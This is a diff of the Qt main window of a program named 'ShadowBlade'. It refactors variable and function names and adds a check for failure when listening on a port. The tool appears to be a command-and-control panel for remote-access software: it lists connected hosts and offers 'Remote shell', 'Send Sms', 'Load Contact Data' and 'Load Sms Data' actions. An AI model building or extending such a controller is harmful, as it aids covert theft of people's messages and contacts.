@@ -16,13 +16,13 @@
 MainWindow::MainWindow(SessionManager& sessionManager, QWidget *parent) :
     mSessionManager(sessionManager),
     mNetworkManager(sessionManager),
-    mModel(mNetworkManager.getHostPool()),
+    mModelHostList(mNetworkManager.getHostPool()),
+    mPort(8000),
     QMainWindow(parent),
     ui(new Ui::MainWindow)
 {
     ui->setupUi(this);
-    initView();
-    updateView();
+    init();
 }
 
 MainWindow::~MainWindow()
@@ -45,23 +45,23 @@ void MainWindow::closeEvent(QCloseEvent * event)
 void MainWindow::initRightMenu(QWidget* widget)
 {
     QAction *aAll,*aNone,*aReverse;
-    widget->addAction(aAll = new QAction(QString("Select All"),ui->tableView));
-    widget->addAction(aNone = new QAction(QString("unSelect All"),ui->tableView));
-    widget->addAction(aReverse = new QAction(QString("Reverse Select"),ui->tableView));
+    widget->addAction(aAll = new QAction(QString("Select All"),ui->tableViewHostList));
+    widget->addAction(aNone = new QAction(QString("unSelect All"),ui->tableViewHostList));
+    widget->addAction(aReverse = new QAction(QString("Reverse Select"),ui->tableViewHostList));
 
-    QObject::connect(aAll,SIGNAL(triggered()),&mModel,SLOT(selectAll()));
-    QObject::connect(aNone,SIGNAL(triggered()),&mModel,SLOT(unselectAll()));
-    QObject::connect(aReverse,SIGNAL(triggered()),&mModel,SLOT(reverseSelect()));
+    QObject::connect(aAll,SIGNAL(triggered()),&mModelHostList,SLOT(selectAll()));
+    QObject::connect(aNone,SIGNAL(triggered()),&mModelHostList,SLOT(unselectAll()));
+    QObject::connect(aReverse,SIGNAL(triggered()),&mModelHostList,SLOT(reverseSelect()));
 
-    QAction *separator = new QAction(QString(),ui->tableView);
+    QAction *separator = new QAction(QString(),ui->tableViewHostList);
     separator->setSeparator(true);
     widget->addAction(separator);
 
 
     QAction *aSendSms,*aLoadContact,*aLoadSms;
-    widget->addAction(aSendSms = new QAction(QString("Send Sms"),ui->tableView));
-    widget->addAction(aLoadContact = new QAction(QString("Load Contact Data"),ui->tableView));
-    widget->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableView));
+    widget->addAction(aSendSms = new QAction(QString("Send Sms"),ui->tableViewHostList));
+    widget->addAction(aLoadContact = new QAction(QString("Load Contact Data"),ui->tableViewHostList));
+    widget->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableViewHostList));
 
     QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
     QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
@@ -71,32 +71,44 @@ void MainWindow::initRightMenu(QWidget* widget)
 void MainWindow::initLeftMenu(QWidget* widget)
 {
     QAction *aRemoteShell;
-    widget->addAction(aRemoteShell = new QAction(QString("Remote shell"),ui->tableView) );
+    widget->addAction(aRemoteShell = new QAction(QString("Remote shell"),ui->tableViewHostList) );
 
 }
 
-void MainWindow::initView()
+void MainWindow::initNetworkManager()
 {
     qRegisterMetaType<HostInfo>("HostInfo");
-    QObject::connect(&mNetworkManager, SIGNAL(onHostPoolChange()), &mModel, SLOT(refresh()));
+    QObject::connect(&mNetworkManager, SIGNAL(onHostPoolChange()), &mModelHostList, SLOT(refresh()));
     QObject::connect(&mNetworkManager, SIGNAL(onStartSessionSuccess(QString,HostInfo)), this, SLOT(onStartSessionSuccess(QString,HostInfo)));
     QObject::connect(&mNetworkManager, SIGNAL(onStartSessionFailed(QString,HostInfo)), this, SLOT(onStartSessionFailed(QString,HostInfo)));
-    QObject::connect(&mModel,SIGNAL(modelReset()),this,SLOT(updateView()));
-    ui->tableView->setModel(&mModel);
-    ui->tableView->setContextMenuPolicy(Qt::ActionsContextMenu);
-    ui->tableView->resizeColumnToContents(0);
-    ui->tableView->horizontalHeader()->resizeSection(1, 200);
+}
+
+void MainWindow::initHostList()
+{
+    ui->tableViewHostList->setModel(&mModelHostList);
+    ui->tableViewHostList->setContextMenuPolicy(Qt::ActionsContextMenu);
+    ui->tableViewHostList->resizeColumnToContents(0);
+    ui->tableViewHostList->horizontalHeader()->resizeSection(1, 200);
+    QObject::connect(&mModelHostList,SIGNAL(modelReset()),this,SLOT(updateHostListView()));
+}
+
+
+void MainWindow::init()
+{
+    initNetworkManager();
+    initHostList();
 
     initLeftMenu(&mLeftMenu);
-    initRightMenu(ui->tableView);
+    initRightMenu(ui->tableViewHostList);
 
-    ui->actionStartServer->setText("Start Server");
-    QObject::connect(ui->actionStartServer, SIGNAL(triggered()), this, SLOT(handleServerStart()));
+    ui->actionListenPort->setText("Listen Port");
+    QObject::connect(ui->actionListenPort, SIGNAL(triggered()), this, SLOT(handleServerStart()));
+    updateHostListView();
 
     outputLogWarning("====================   ShadowBlade Running  ====================");
 }
 
-void MainWindow::updateView()
+void MainWindow::updateHostListView()
 {
     ui->hostCountLabel->setText(QString("Host: %1, Selected: %2").arg(mNetworkManager.getHostPool().size()).arg(mNetworkManager.getHostPool().getSelectedCount()));
 }
@@ -107,18 +119,24 @@ void MainWindow::handleServerStart()
     {
         mNetworkManager.stop();
         mNetworkManager.getHostPool().cleanAll();
-        ui->actionStartServer->setText("Start Server");
-        outputLogNormal("Server Stop");
+        ui->actionListenPort->setText("Listen Port");
+        outputLogNormal("Listen Stop");
     }
     else
     {
         bool ok = false;
-        int port = QInputDialog::getInt(this, "Listen Port", "Input port:", 8000,  1, 65535, 1, &ok);
+        mPort = QInputDialog::getInt(this, "Listen Port", "Input port:", mPort,  1, 65535, 1, &ok);
         if(ok)
         {
-            ui->actionStartServer->setText(QString("Stop Server (Listen on %1)").arg(port));
-            mNetworkManager.start(port);
-            outputLogNormal(QString("Server Start on port: %1").arg(port) );
+            if(mNetworkManager.start(mPort))
+            {
+                ui->actionListenPort->setText(QString("Stop Listen (Listen on port: %1)").arg(mPort));
+                outputLogNormal(QString("Listen Start on port: %1").arg(mPort) );
+            }
+            else
+            {
+                outputLogWarning(QString("[FAILED] Listen Start on port: %1").arg(mPort) );
+            }
         }
     }
 }
@@ -182,10 +200,12 @@ void MainWindow::loadContact()
     }
 }
 
-void MainWindow::on_tableView_doubleClicked(const QModelIndex &index)
+void MainWindow::on_tableViewHostList_doubleClicked(const QModelIndex &index)
 {
-    mCurrentIndex = index.row();
-    mLeftMenu.popup(cursor().pos());
+    if(mNetworkManager.getHostPool().getHostInfo(index.row(), mHostInfo))
+    {
+        mLeftMenu.popup(cursor().pos());
+    }
 }
 
 void MainWindow::outputLogNormal(const QString& text)
